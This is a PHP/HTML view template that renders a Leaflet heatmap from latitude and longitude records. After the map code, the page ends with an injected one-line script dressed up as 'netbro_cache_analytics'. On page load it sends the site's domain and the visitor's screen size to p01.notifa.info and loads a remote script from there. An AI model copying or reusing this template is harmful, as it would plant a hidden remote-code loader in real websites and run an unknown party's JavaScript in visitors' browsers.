
<!DOCTYPE html>
<html>
<head lang='en'>
  <meta charset='utf-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.6.0/dist/leaflet.css" integrity="sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ==" crossorigin=""/>
  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
  <script src="<?= base_url() ?>petapanas/dist/leaflet-heat.js"></script>

    <script src="http://leaflet.github.io/Leaflet.markercluster/example/realworld.10000.js"></script>
  <style>
    html, body {margin:0;padding:0;}
    #map {width:100%;height:380px;}
    .leaflet-popup-content-wrapper {border-radius: 0px !important;}
  </style>
</head>
<body>
<div class="main-content" style="margin-top:-70px;">
<br/><p></p>
  <div id='map'></div>
   <script>
    // declare variable as global
    // var map;
    // // declare basemap -- OSM
    // var OpenStreetMapLayer = new L.TileLayer("http://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
    //   minZoom: 8, 
    //   maxZoom: 30, 
    //   attribution: `Map Data &copy; <a href='http://openstreetmap.org'>OpenStreetMap</a> contributors.`
    // });

    var map = L.map('map').setView([-6.91912, 106.92950], 12);

    var tiles = L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors',
    }).addTo(map);
    // GeoJSON object
    <?php    
    $heatmapData=array();
    ?>

        var heatmap = L.heatLayer([
            <?php foreach($tps as $key){?>
            [<?= $key['latitude']?>, <?= $key['longitude']?>, 571],
            <?php } ?>
        ], {radius: 25}).addTo(map);

        var heat = L.heatLayer(heatmap).addTo(map);
  
  
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +  + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</div>
</html>